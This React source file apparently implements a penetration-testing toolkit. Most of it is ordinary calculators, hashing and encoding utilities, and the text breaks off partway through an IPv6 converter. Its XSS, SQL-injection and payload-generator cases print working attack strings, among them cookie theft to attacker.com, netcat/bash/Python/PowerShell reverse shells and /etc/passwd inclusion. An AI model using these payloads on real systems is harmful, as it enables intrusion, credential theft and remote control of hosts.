import React, { useState, useRef, useEffect } from 'react';
import { tools, TOOL_CATEGORIES, Tool } from '../data/toolkitdata';

// ─── Category Icons ───────────────────────────────────────────────────────────
const CATEGORY_ICONS: Record<string, string> = {
  'Security & Penetration Testing': '🔐',
  'Password & Authentication': '🔑',
  'Encoding, Decoding & Cryptography': '🔎',
  'Digital Forensics & Analysis': '🧪',
  'Networking & IP Calculation': '🌐',
  'Storage, Cloud & Data Transfer': '💾',
  'General Developer & Utility': '🧮',
};

// ─── OUI Vendor Map (sample offline list) ────────────────────────────────────
const OUI_MAP: Record<string, string> = {
  '00:00:0C': 'Cisco Systems',
  '00:1A:2B': 'Quanta Computer',
  '00:50:56': 'VMware',
  '00:0C:29': 'VMware (Guest)',
  'B8:27:EB': 'Raspberry Pi Foundation',
  'DC:A6:32': 'Raspberry Pi Trading',
  '00:1B:44': 'SanDisk',
  'F4:5C:89': 'Apple',
  'A4:C3:F0': 'Apple',
  '3C:22:FB': 'Apple',
  '00:23:AE': 'Dell',
  'F8:BC:12': 'Dell',
  'FC:15:B4': 'Dell',
  '00:16:3E': 'Xensource (Citrix)',
  '00:25:90': 'Super Micro Computer',
  '00:1D:7E': 'Cisco-Linksys',
  '00:18:F8': 'Hewlett Packard',
  '3C:D9:2B': 'Hewlett Packard Enterprise',
  '00:26:B9': 'Dell Global B.V.',
  '28:D2:44': 'NETGEAR',
  'C0:3F:D5': 'NETGEAR',
  '00:09:5B': 'NETGEAR',
  '00:14:BF': 'Linksys',
  '00:21:29': 'Cisco Systems (AIRONET)',
};

// ─── CVSS v3.1 Scoring ───────────────────────────────────────────────────────
function calculateCVSS(vector: string): string {
  const map: Record<string, Record<string, number>> = {
    AV: { N: 0.85, A: 0.62, L: 0.55, P: 0.2 },
    AC: { L: 0.77, H: 0.44 },
    PR: { N: 0.85, L: 0.62, H: 0.27 },
    UI: { N: 0.85, R: 0.62 },
    C:  { N: 0.0,  L: 0.22, H: 0.56 },
    I:  { N: 0.0,  L: 0.22, H: 0.56 },
    A:  { N: 0.0,  L: 0.22, H: 0.56 },
  };
  const scopeChange: Record<string, boolean> = { U: false, C: true };

  const parts: Record<string, string> = {};
  vector.split('/').forEach(part => {
    const [k, v] = part.split(':');
    parts[k] = v;
  });

  const required = ['AV', 'AC', 'PR', 'UI', 'S', 'C', 'I', 'A'];
  for (const r of required) {
    if (!parts[r]) return `ERROR: Missing metric "${r}" in vector string.`;
  }

  const scopeChanged = scopeChange[parts['S']];
  const prMap = scopeChanged
    ? { N: 0.85, L: 0.68, H: 0.50 }
    : { N: 0.85, L: 0.62, H: 0.27 };

  const AV = map.AV[parts['AV']] ?? 0;
  const AC = map.AC[parts['AC']] ?? 0;
  const PR = prMap[parts['PR'] as keyof typeof prMap] ?? 0;
  const UI = map.UI[parts['UI']] ?? 0;
  const C  = map.C[parts['C']] ?? 0;
  const I  = map.I[parts['I']] ?? 0;
  const A  = map.A[parts['A']] ?? 0;

  const ISCBase = 1 - (1 - C) * (1 - I) * (1 - A);
  const ISC = scopeChanged
    ? 7.52 * (ISCBase - 0.029) - 3.25 * Math.pow(ISCBase - 0.02, 15)
    : 6.42 * ISCBase;

  const Exploitability = 8.22 * AV * AC * PR * UI;
  let baseScore = 0;
  if (ISC <= 0) {
    baseScore = 0;
  } else {
    const raw = scopeChanged
      ? Math.min(1.08 * (ISC + Exploitability), 10)
      : Math.min(ISC + Exploitability, 10);
    baseScore = Math.ceil(raw * 10) / 10;
  }

  const severity =
    baseScore === 0 ? 'None' :
    baseScore < 4   ? 'Low' :
    baseScore < 7   ? 'Medium' :
    baseScore < 9   ? 'High' : 'Critical';

  return [
    `CVSS v3.1 Base Score: ${baseScore.toFixed(1)}`,
    `Severity: ${severity}`,
    `─────────────────────────────`,
    `Attack Vector:        ${parts['AV']}`,
    `Attack Complexity:    ${parts['AC']}`,
    `Privileges Required:  ${parts['PR']}`,
    `User Interaction:     ${parts['UI']}`,
    `Scope:                ${parts['S']}`,
    `Confidentiality:      ${parts['C']}`,
    `Integrity:            ${parts['I']}`,
    `Availability:         ${parts['A']}`,
  ].join('\n');
}

// ─── IP to Number helpers ─────────────────────────────────────────────────────
function ipToNum(ip: string): number {
  return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
}
function numToIp(num: number): string {
  return [(num >>> 24) & 255, (num >>> 16) & 255, (num >>> 8) & 255, num & 255].join('.');
}

// ─── Main Component ───────────────────────────────────────────────────────────
const Toolkit: React.FC = () => {
  const [selectedTool, setSelectedTool] = useState<Tool | null>(null);
  const [input, setInput]   = useState<string>('');
  const [output, setOutput] = useState<string>('');
  const [fileOutput, setFileOutput] = useState<string>('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  const openTool = (tool: Tool) => {
    setSelectedTool(tool);
    setOutput('');
    setFileOutput('');
    setInput('');
  };

  // ─── All Tool Execution Logic ───────────────────────────────────────────────
  const handleExecute = async () => {
    if (!selectedTool) return;
    let result = '';
    const raw = input.trim();

    try {
      switch (selectedTool.id) {

        // ── XSS Tester ─────────────────────────────────────────────────────
        case 'xss-tester': {
          const param = raw || 'input';
          result = [
            `// XSS Payloads for parameter: ${param}`,
            `─────────────────────────────────────────`,
            `[BASIC]`,
            `<script>alert('XSS')</script>`,
            `<script>alert(document.cookie)</script>`,
            ``,
            `[IMG ONERROR]`,
            `<img src=x onerror=alert(1)>`,
            `<img src="javascript:alert('XSS')">`,
            ``,
            `[SVG / BODY]`,
            `<svg onload=alert(1)>`,
            `<body onload=alert(1)>`,
            `<details open ontoggle=alert(1)>`,
            ``,
            `[DOM BASED]`,
            `"><script>document.location='http://attacker.com?c='+document.cookie</script>`,
            // eslint-disable-next-line no-script-url
            `javascript:alert(document.domain)`,
            ``,
            `[FILTER BYPASS]`,
            `<scr<script>ipt>alert('XSS')</scr</script>ipt>`,
            `<IMG SRC=j&#X41;vascript:alert('XSS')>`,
            `%3Cscript%3Ealert(1)%3C/script%3E`,
          ].join('\n');
          break;
        }

        // ── SQL Injection ───────────────────────────────────────────────────
        case 'sql-tester': {
          const db = raw.toLowerCase() || 'mysql';
          const commonPayloads = [
            `[AUTHENTICATION BYPASS]`,
            `' OR '1'='1`,
            `' OR 1=1--`,
            `admin'--`,
            `' OR 'x'='x`,
            ``,
            `[UNION BASED - ${db.toUpperCase()}]`,
            db === 'mssql'
              ? `' UNION SELECT NULL, @@version--`
              : db === 'oracle'
              ? `' UNION SELECT NULL, banner FROM v$version--`
              : `' UNION SELECT NULL, version()--`,
            `' UNION SELECT 1,2,3--`,
            `' UNION SELECT table_name,2 FROM information_schema.tables--`,
            ``,
            `[BLIND / TIME-BASED]`,
            db === 'mssql'
              ? `'; WAITFOR DELAY '0:0:5'--`
              : db === 'oracle'
              ? `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`
              : `' AND SLEEP(5)--`,
            `' AND 1=1--  (true)`,
            `' AND 1=2--  (false)`,
            ``,
            `[ERROR BASED]`,
            `' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--`,
            `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
          ];
          result = commonPayloads.join('\n');
          break;
        }

        // ── Payload Generator ───────────────────────────────────────────────
        case 'payload-gen': {
          const parts = raw.split(/\s+/);
          const type = (parts[0] || 'revshell').toLowerCase();
          const lhost = parts[1] || 'LHOST';
          const lport = parts[2] || 'LPORT';
          if (type === 'revshell' || type === 'bash') {
            result = [
              `// Reverse Shell Payloads → ${lhost}:${lport}`,
              `─────────────────────────────────────────`,
              `[BASH]`,
              `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
              ``,
              `[PYTHON]`,
              `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
              ``,
              `[PHP]`,
              `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
              ``,
              `[NETCAT]`,
              `nc -e /bin/sh ${lhost} ${lport}`,
              `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
              ``,
              `[POWERSHELL]`,
              `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
            ].join('\n');
          } else if (type === 'lfi') {
            result = [
              `// LFI Payloads`,
              `─────────────────────────────────────────`,
              `../../../etc/passwd`,
              `..%2F..%2F..%2Fetc%2Fpasswd`,
              `....//....//....//etc/passwd`,
              `/etc/passwd%00`,
              `php://filter/convert.base64-encode/resource=/etc/passwd`,
              `php://input`,
              `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
              `expect://id`,
            ].join('\n');
          } else if (type === 'rfi') {
            result = [
              `// RFI Payloads`,
              `─────────────────────────────────────────`,
              `http://${lhost}/shell.php`,
              `http://${lhost}/shell.php%00`,
              `http://${lhost}/shell.php?`,
              `ftp://${lhost}/shell.txt`,
              `smb://${lhost}/share/shell.php`,
            ].join('\n');
          } else {
            result = `Unknown type: ${type}\nUse: revshell | lfi | rfi | bash | python | php`;
          }
          break;
        }

        // ── Firewall Rule Generator ─────────────────────────────────────────
        case 'firewall-gen': {
          const lines = raw.split('\n').filter(Boolean);
          const rules: string[] = ['// Generated Firewall Rules', '─────────────────────────'];
          lines.forEach(line => {
            const p = line.trim().split(/\s+/);
            const action = (p[0] || 'allow').toLowerCase();
            const proto  = (p[1] || 'tcp').toLowerCase();
            const port   = p[2] || '80';
            const ip     = p[3] || '';

            const iptAction = action === 'allow' ? 'ACCEPT' : 'DROP';
            const ipPart = ip ? `-s ${ip} ` : '';

            rules.push(`[iptables]  iptables -A INPUT ${ipPart}-p ${proto} --dport ${port} -j ${iptAction}`);
            rules.push(`[ufw]       ufw ${action === 'allow' ? 'allow' : 'deny'} ${ip ? `from ${ip} to any ` : ''}proto ${proto} to any port ${port}`);
            rules.push('');
          });
          result = rules.join('\n');
          break;
        }

        // ── Hash Identifier ─────────────────────────────────────────────────
        case 'hash-id': {
          const h = raw.replace(/\s/g, '');
          const len = h.length;
          const isHex = /^[0-9a-fA-F]+$/.test(h);
          const isBase64 = /^[A-Za-z0-9+/]+=*$/.test(h);
          const candidates: string[] = [];
          if (isHex) {
            if (len === 32)  candidates.push('MD5', 'NTLM', 'MD4');
            if (len === 40)  candidates.push('SHA-1', 'HmacSHA1', 'MySQL 4.1+');
            if (len === 56)  candidates.push('SHA-224', 'Haval-224');
            if (len === 64)  candidates.push('SHA-256', 'Keccak-256', 'Blake2s');
            if (len === 96)  candidates.push('SHA-384');
            if (len === 128) candidates.push('SHA-512', 'Whirlpool', 'SHA3-512');
          }
          if (isBase64 && len === 44) candidates.push('SHA-256 (Base64)', 'bcrypt component');
          if (h.startsWith('$2a$') || h.startsWith('$2b$')) candidates.push('bcrypt');
          if (h.startsWith('$6$')) candidates.push('SHA-512crypt (Linux shadow)');
          if (h.startsWith('$5$')) candidates.push('SHA-256crypt');
          if (h.startsWith('$1$')) candidates.push('MD5crypt');
          if (h.startsWith('sha1:')) candidates.push('Django SHA1 hash');
          if (h.startsWith('pbkdf2')) candidates.push('PBKDF2');
          result = [
            `Hash: ${h.substring(0, 32)}${h.length > 32 ? '...' : ''}`,
            `Length: ${len} chars`,
            `Format: ${isHex ? 'Hexadecimal' : isBase64 ? 'Base64-like' : 'Unknown format'}`,
            `─────────────────────────────────────────`,
            candidates.length
              ? `Possible types:\n${candidates.map(c => `  ✓ ${c}`).join('\n')}`
              : `No match found. Length ${len} is not a standard hash length.`,
          ].join('\n');
          break;
        }

        // ── Hashing Calculator ──────────────────────────────────────────────
        case 'hash-calc': {
          const encode = (buf: ArrayBuffer) =>
            Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
          const enc = new TextEncoder().encode(raw);
          const [sha256, sha1] = await Promise.all([
            crypto.subtle.digest('SHA-256', enc),
            crypto.subtle.digest('SHA-1', enc),
          ]);
          // MD5 via simple implementation
          const md5 = await (async () => {
            // Simple MD5 — browser fallback (not crypto.subtle supported)
            let i;
            const S = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
            const K: number[] = [];
            for (i = 0; i < 64; i++) K.push(Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296));
            const bytes = new TextEncoder().encode(raw);
            const byteLen = bytes.length;
            const bitLen = byteLen * 8;
            const extra = byteLen % 64 < 56 ? 55 - (byteLen % 64) : 119 - (byteLen % 64);
            const msg = new Uint8Array(byteLen + extra + 9);
            msg.set(bytes);
            msg[byteLen] = 0x80;
            const view = new DataView(msg.buffer);
            view.setUint32(msg.length - 8, bitLen >>> 0, true);
            view.setUint32(msg.length - 4, Math.floor(bitLen / 4294967296), true);
            let a0 = 0x67452301, b0 = 0xEFCDAB89, c0 = 0x98BADCFE, d0 = 0x10325476;
            for (i = 0; i < msg.length; i += 64) {
              const M: number[] = [];
              for (let j = 0; j < 16; j++) M.push(view.getUint32(i + j * 4, true));
              let [A, B, C, D] = [a0, b0, c0, d0];
              for (let j = 0; j < 64; j++) {
                let F: number, g: number;
                if (j < 16)       { F = (B & C) | (~B & D); g = j; }
                else if (j < 32)  { F = (D & B) | (~D & C); g = (5 * j + 1) % 16; }
                else if (j < 48)  { F = B ^ C ^ D;           g = (3 * j + 5) % 16; }
                else              { F = C ^ (B | ~D);         g = (7 * j) % 16; }
                F = (F + A + K[j] + M[g]) >>> 0;
                A = D; D = C; C = B;
                B = (B + ((F << S[j]) | (F >>> (32 - S[j])))) >>> 0;
              }
              a0 = (a0 + A) >>> 0; b0 = (b0 + B) >>> 0;
              c0 = (c0 + C) >>> 0; d0 = (d0 + D) >>> 0;
            }
            const toLE = (n: number) => [n & 255, (n >> 8) & 255, (n >> 16) & 255, (n >> 24) & 255].map(b => b.toString(16).padStart(2, '0')).join('');
            return toLE(a0) + toLE(b0) + toLE(c0) + toLE(d0);
          })();
          result = [
            `Input: "${raw}"`,
            `─────────────────────────────────────────`,
            `MD5:    ${md5}`,
            `SHA-1:  ${encode(sha1)}`,
            `SHA-256: ${encode(sha256)}`,
          ].join('\n');
          break;
        }

        // ── Encrypt / Decrypt ───────────────────────────────────────────────
        case 'enc-dec': {
          const [mode, key, ...textParts] = raw.split('::');
          const text = textParts.join('::');
          if (!mode || !key || !text) {
            result = 'Format: encrypt::KEY::TEXT  or  decrypt::KEY::CIPHERTEXT';
            break;
          }
          const keyMaterial = await crypto.subtle.importKey(
            'raw', new TextEncoder().encode(key.padEnd(32, '0').substring(0, 32)),
            { name: 'AES-GCM' }, false, ['encrypt', 'decrypt']
          );
          if (mode.toLowerCase() === 'encrypt') {
            const iv = crypto.getRandomValues(new Uint8Array(12));
            const enc2 = await crypto.subtle.encrypt(
              { name: 'AES-GCM', iv },
              keyMaterial,
              new TextEncoder().encode(text)
            );
            const combined = new Uint8Array(iv.byteLength + enc2.byteLength);
            combined.set(iv); combined.set(new Uint8Array(enc2), iv.byteLength);
            result = `ENCRYPTED (AES-256-GCM):\n${btoa(Array.from(combined).map(b => String.fromCharCode(b)).join(''))}`;
          } else {
            const combined = Uint8Array.from(atob(text), c => c.charCodeAt(0));
            const iv = combined.slice(0, 12);
            const data = combined.slice(12);
            const dec = await crypto.subtle.decrypt(
              { name: 'AES-GCM', iv },
              keyMaterial, data
            );
            result = `DECRYPTED:\n${new TextDecoder().decode(dec)}`;
          }
          break;
        }

        // ── Fibonacci Hash ──────────────────────────────────────────────────
        case 'fib-hash': {
          const PHI = 2654435761; // Knuth's golden ratio constant
          let num = 0;
          if (/^\d+$/.test(raw)) {
            num = parseInt(raw, 10);
          } else {
            for (let i = 0; i < raw.length; i++) num += raw.charCodeAt(i);
          }
          const sizes = [16, 32, 64, 256, 1024];
          result = [
            `Input: "${raw}"  (numeric value: ${num})`,
            `Golden Ratio Constant: 2654435761`,
            `─────────────────────────────────────────`,
            ...sizes.map(s => {
              const hash = ((num * PHI) >>> 0) % s;
              return `Table size ${s.toString().padStart(5)}: bucket ${hash}`;
            }),
            ``,
            `Raw product (mod 2^32): ${((num * PHI) >>> 0)}`,
          ].join('\n');
          break;
        }

        // ── Password Generator ──────────────────────────────────────────────
        case 'pass-gen': {
          const parts2 = raw.toLowerCase().split(/\s+/);
          const len = parseInt(parts2[0]) || 16;
          const useUpper   = !raw.includes('-upper');
          const useLower   = !raw.includes('-lower');
          const useDigits  = !raw.includes('-digits');
          const useSymbols = raw.includes('+symbols');
          const noAmbig    = raw.includes('+no-ambiguous');
          let charset = '';
          if (useLower)   charset += noAmbig ? 'abcdefghjkmnpqrstuvwxyz' : 'abcdefghijklmnopqrstuvwxyz';
          if (useUpper)   charset += noAmbig ? 'ABCDEFGHJKMNPQRSTUVWXYZ' : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
          if (useDigits)  charset += noAmbig ? '23456789' : '0123456789';
          if (useSymbols) charset += '!@#$%^&*()-_=+[]{}|;:,.<>?';
          if (!charset)   charset = 'abcdefghijklmnopqrstuvwxyz';
          const arr = crypto.getRandomValues(new Uint32Array(len));
          const pass = Array.from(arr).map(n => charset[n % charset.length]).join('');
          // Entropy
          const entropy = Math.log2(Math.pow(charset.length, len)).toFixed(1);
          result = [
            `Generated Password (length: ${len}):`,
            ``,
            pass,
            ``,
            `─────────────────────────────────────────`,
            `Charset size: ${charset.length} characters`,
            `Entropy: ~${entropy} bits`,
            `Estimated crack time (offline fast attack):`,
            parseFloat(entropy) > 100 ? '  Effectively uncrackable' :
            parseFloat(entropy) > 80  ? '  Centuries' :
            parseFloat(entropy) > 60  ? '  Years' :
            parseFloat(entropy) > 40  ? '  Days to weeks' : '  Hours or less',
          ].join('\n');
          break;
        }

        // ── Password Strength ───────────────────────────────────────────────
        case 'pass-strength': {
          const p = raw;
          let charsetSize = 0;
          if (/[a-z]/.test(p)) charsetSize += 26;
          if (/[A-Z]/.test(p)) charsetSize += 26;
          if (/[0-9]/.test(p)) charsetSize += 10;
          if (/[^a-zA-Z0-9]/.test(p)) charsetSize += 32;
          const entropy = (Math.log2(charsetSize || 1) * p.length).toFixed(1);
          const score =
            parseFloat(entropy) > 100 ? 5 :
            parseFloat(entropy) > 80  ? 4 :
            parseFloat(entropy) > 60  ? 3 :
            parseFloat(entropy) > 40  ? 2 : 1;
          const label = ['', 'Very Weak', 'Weak', 'Fair', 'Strong', 'Very Strong'][score];
          const bar = '█'.repeat(score * 4) + '░'.repeat(20 - score * 4);
          const checks = [
            ['Length ≥ 8',   p.length >= 8],
            ['Length ≥ 12',  p.length >= 12],
            ['Lowercase',    /[a-z]/.test(p)],
            ['Uppercase',    /[A-Z]/.test(p)],
            ['Digits',       /[0-9]/.test(p)],
            ['Symbols',      /[^a-zA-Z0-9]/.test(p)],
            ['No spaces',    !/\s/.test(p)],
          ];
          result = [
            `Password: ${'*'.repeat(Math.min(p.length, 20))}${p.length > 20 ? '...' : ''}`,
            `Length: ${p.length} characters`,
            `Charset size: ${charsetSize}`,
            `Entropy: ~${entropy} bits`,
            ``,
            `Strength: ${label}`,
            `[${bar}]`,
            ``,
            `Checks:`,
            ...checks.map(([name, pass]) => `  ${pass ? '✓' : '✗'} ${name}`),
            ``,
            `Crack time estimate (online throttled): ${parseFloat(entropy) > 60 ? 'Years+' : parseFloat(entropy) > 40 ? 'Months' : 'Hours'}`,
            `Crack time estimate (offline fast GPU):  ${parseFloat(entropy) > 100 ? 'Uncrackable' : parseFloat(entropy) > 80 ? 'Centuries' : parseFloat(entropy) > 60 ? 'Years' : parseFloat(entropy) > 40 ? 'Days' : 'Minutes'}`,
          ].join('\n');
          break;
        }

        // ── Base64 ──────────────────────────────────────────────────────────
        case 'base64': {
          if (raw.startsWith('decode::')) {
            result = atob(raw.replace('decode::', ''));
          } else {
            const text2 = raw.startsWith('encode::') ? raw.replace('encode::', '') : raw;
            result = `Encoded: ${btoa(unescape(encodeURIComponent(text2)))}`;
          }
          break;
        }

        // ── URL Encoder ─────────────────────────────────────────────────────
        case 'url-enc': {
          if (raw.startsWith('decode::')) {
            result = `Decoded: ${decodeURIComponent(raw.replace('decode::', ''))}`;
          } else {
            const text2 = raw.startsWith('encode::') ? raw.replace('encode::', '') : raw;
            result = `Encoded: ${encodeURIComponent(text2)}`;
          }
          break;
        }

        // ── Hex / ASCII ─────────────────────────────────────────────────────
        case 'hex-ascii': {
          if (raw.startsWith('hex2ascii::') || raw.startsWith('hex2ascii:')) {
            const hex = raw.split('::')[1].replace(/\s/g, '');
            result = `ASCII: ${hex.match(/.{1,2}/g)?.map(h => String.fromCharCode(parseInt(h, 16))).join('') || 'Invalid hex'}`;
          } else {
            const text2 = raw.replace('ascii2hex::', '');
            result = `HEX: ${Array.from(text2).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ')}`;
          }
          break;
        }

        // ── Binary / Dec / Hex ──────────────────────────────────────────────
        case 'bin-dec-hex': {
          const [from, val] = raw.split('::');
          let decimal: number;
          if (from === 'bin')      decimal = parseInt(val, 2);
          else if (from === 'hex') decimal = parseInt(val, 16);
          else                     decimal = parseInt(val, 10);
          result = [
            `Input (${from}): ${val}`,
            `─────────────────────────────────────────`,
            `Binary:      ${decimal.toString(2)}`,
            `Decimal:     ${decimal.toString(10)}`,
            `Hexadecimal: ${decimal.toString(16).toUpperCase()}`,
            `Octal:       ${decimal.toString(8)}`,
          ].join('\n');
          break;
        }

        // ── Caesar / ROT ────────────────────────────────────────────────────
        case 'caesar': {
          const [shiftStr, ...rest] = raw.split('::');
          const shift = parseInt(shiftStr) || 13;
          const text2 = rest.join('::');
          const shifted = Array.from(text2).map(c => {
            if (/[a-z]/.test(c)) return String.fromCharCode(((c.charCodeAt(0) - 97 + shift) % 26) + 97);
            if (/[A-Z]/.test(c)) return String.fromCharCode(((c.charCodeAt(0) - 65 + shift) % 26) + 65);
            return c;
          }).join('');
          result = [
            `ROT-${shift} Applied:`,
            `Original: ${text2}`,
            `Encoded:  ${shifted}`,
            ``,
            `All ROT values:`,
            ...Array.from({ length: 25 }, (_, i) => {
              const s = i + 1;
              const r = Array.from(text2).map(c => {
                if (/[a-z]/.test(c)) return String.fromCharCode(((c.charCodeAt(0) - 97 + s) % 26) + 97);
                if (/[A-Z]/.test(c)) return String.fromCharCode(((c.charCodeAt(0) - 65 + s) % 26) + 65);
                return c;
              }).join('');
              return `  ROT${s.toString().padStart(2)}: ${r}`;
            }),
          ].join('\n');
          break;
        }

        // ── String Extractor ────────────────────────────────────────────────
        case 'string-ext': {
          const printable = raw.match(/[\x20-\x7E]{4,}/g) || [];
          result = [
            `Extracted ${printable.length} printable string(s) (min length 4):`,
            `─────────────────────────────────────────`,
            ...printable.map((s, i) => `[${String(i + 1).padStart(3, '0')}] ${s}`),
          ].join('\n');
          break;
        }

        // ── Log Analyzer ────────────────────────────────────────────────────
        case 'log-analyser': {
          const lines = raw.split('\n').filter(Boolean);
          const ipPattern = /\b(\d{1,3}\.){3}\d{1,3}\b/g;
          const errorPat  = /error|fail|warn|critical|denied|forbidden|unauthorized/gi;
          const statusPat = /\b[2345]\d{2}\b/g;
          const ips: Record<string, number> = {};
          const statuses: Record<string, number> = {};
          let errorCount = 0;
          lines.forEach(line => {
            (line.match(ipPattern) || []).forEach(ip => { ips[ip] = (ips[ip] || 0) + 1; });
            (line.match(statusPat) || []).forEach(s => { statuses[s] = (statuses[s] || 0) + 1; });
            if (errorPat.test(line)) errorCount++;
          });
          const topIPs = Object.entries(ips).sort(([, a], [, b]) => b - a).slice(0, 10);
          const topStatus = Object.entries(statuses).sort(([, a], [, b]) => b - a);
          result = [
            `Log Analysis Report`,
            `─────────────────────────────────────────`,
            `Total lines: ${lines.length}`,
            `Error/Warn lines: ${errorCount}`,
            ``,
            `Top IP Addresses:`,
            ...topIPs.map(([ip, cnt]) => `  ${ip.padEnd(16)} → ${cnt} hits`),
            ``,
            `HTTP Status Codes:`,
            ...topStatus.map(([s, cnt]) => `  ${s} → ${cnt}`),
          ].join('\n');
          break;
        }

        // ── Incident Timeline ───────────────────────────────────────────────
        case 'incident-time': {
          const events = raw.split('\n')
            .filter(l => l.includes('|'))
            .map(l => {
              const [ts, ...desc] = l.split('|');
              return { ts: ts.trim(), desc: desc.join('|').trim() };
            })
            .sort((a, b) => a.ts.localeCompare(b.ts));
          result = [
            `INCIDENT TIMELINE (${events.length} events)`,
            `─────────────────────────────────────────`,
            ...events.map((e, i) => `[${String(i + 1).padStart(3, '0')}] ${e.ts}\n       → ${e.desc}`),
          ].join('\n');
          break;
        }

        // ── CVSS ────────────────────────────────────────────────────────────
        case 'cvss-calc': {
          result = calculateCVSS(raw);
          break;
        }

        // ── Unix Timestamp ──────────────────────────────────────────────────
        case 'unix-ts': {
          if (/^\d+$/.test(raw)) {
            const d = new Date(parseInt(raw) * 1000);
            result = [
              `Unix: ${raw}`,
              `UTC:  ${d.toUTCString()}`,
              `ISO:  ${d.toISOString()}`,
              `Local: ${d.toLocaleString()}`,
            ].join('\n');
          } else {
            const d = new Date(raw);
            result = isNaN(d.getTime())
              ? 'Invalid date. Use: 1700000000 or "2024-01-15 09:30:00"'
              : `Unix Timestamp: ${Math.floor(d.getTime() / 1000)}`;
          }
          break;
        }

        // ── IP Calculator ───────────────────────────────────────────────────
        case 'ip-calc': {
          const match = raw.match(/^(\d+\.\d+\.\d+\.\d+)\/(\d+)$/) ||
                        raw.match(/^(\d+\.\d+\.\d+\.\d+)\s+(\d+\.\d+\.\d+\.\d+)$/);
          if (!match) { result = 'Format: 192.168.1.0/24  or  192.168.1.0 255.255.255.0'; break; }
          let cidr: number;
          if (match[2].includes('.')) {
            const mask = ipToNum(match[2]);
            cidr = (mask >>> 0).toString(2).split('').filter(b => b === '1').length;
          } else {
            cidr = parseInt(match[2]);
          }
          const ip = match[1];
          const maskNum = cidr === 0 ? 0 : (~0 << (32 - cidr)) >>> 0;
          const netNum  = (ipToNum(ip) & maskNum) >>> 0;
          const bcNum   = (netNum | ~maskNum) >>> 0;
          const hosts   = cidr < 31 ? Math.pow(2, 32 - cidr) - 2 : cidr === 31 ? 2 : 1;
          result = [
            `IP:         ${ip}`,
            `CIDR:       /${cidr}`,
            `Subnet Mask: ${numToIp(maskNum)}`,
            `Wildcard:   ${numToIp(~maskNum >>> 0)}`,
            `─────────────────────────────────────────`,
            `Network:    ${numToIp(netNum)}`,
            `Broadcast:  ${numToIp(bcNum)}`,
            `First Host: ${numToIp(netNum + 1)}`,
            `Last Host:  ${numToIp(bcNum - 1)}`,
            `Hosts:      ${hosts.toLocaleString()}`,
          ].join('\n');
          break;
        }

        // ── IP Range ────────────────────────────────────────────────────────
        case 'ip-range': {
          const [start, end] = raw.split('-').map(s => s.trim());
          const startNum = ipToNum(start);
          const endNum   = ipToNum(end);
          const count = endNum - startNum + 1;
          result = [
            `Start: ${start}  (${startNum})`,
            `End:   ${end}  (${endNum})`,
            `Total IPs: ${count.toLocaleString()}`,
            ``,
            count <= 20
              ? `IPs:\n${Array.from({ length: count }, (_, i) => `  ${numToIp(startNum + i)}`).join('\n')}`
              : `First 5: ${Array.from({ length: 5 }, (_, i) => numToIp(startNum + i)).join(', ')}\n...\nLast  5: ${Array.from({ length: 5 }, (_, i) => numToIp(endNum - 4 + i)).join(', ')}`,
          ].join('\n');
          break;
        }

        // ── Network Address ─────────────────────────────────────────────────
        case 'net-addr': {
          const octets = raw.split('.').map(Number);
          const first  = octets[0];
          let cls = '', defMask = '';
          if (first < 128)       { cls = 'A'; defMask = '255.0.0.0'; }
          else if (first < 192)  { cls = 'B'; defMask = '255.255.0.0'; }
          else if (first < 224)  { cls = 'C'; defMask = '255.255.255.0'; }
          else if (first < 240)  { cls = 'D (Multicast)'; }
          else                   { cls = 'E (Reserved)'; }
          const isPrivate =
            (first === 10) ||
            (first === 172 && octets[1] >= 16 && octets[1] <= 31) ||
            (first === 192 && octets[1] === 168) ||
            (first === 127);
          result = [
            `IP Address: ${raw}`,
            `Class: ${cls}`,
            `Default Mask: ${defMask || 'N/A'}`,
            `Type: ${isPrivate ? 'Private (RFC1918)' : 'Public'}`,
            `Loopback: ${first === 127 ? 'Yes' : 'No'}`,
            `Multicast: ${first >= 224 && first < 240 ? 'Yes' : 'No'}`,
          ].join('\n');
          break;
        }

        // ── Wildcard Mask ───────────────────────────────────────────────────
        case 'wildcard': {
          const num = ipToNum(raw);
          const inverted = (~num) >>> 0;
          result = [
            `Input: ${raw}`,
            `Inverted: ${numToIp(inverted)}`,
            `Binary: ${num.toString(2).padStart(32, '0').match(/.{8}/g)?.join('.')}`,
          ].join('\n');
          break;
        }

        // ── IPv4 to IPv6 ────────────────────────────────────────────────────
        case 'ipv4-v6': {
          const oct = raw.split('.').map(n => parseInt(n));
          const hex = oct.map(n => n.toString(16).padStart(2, '0'));
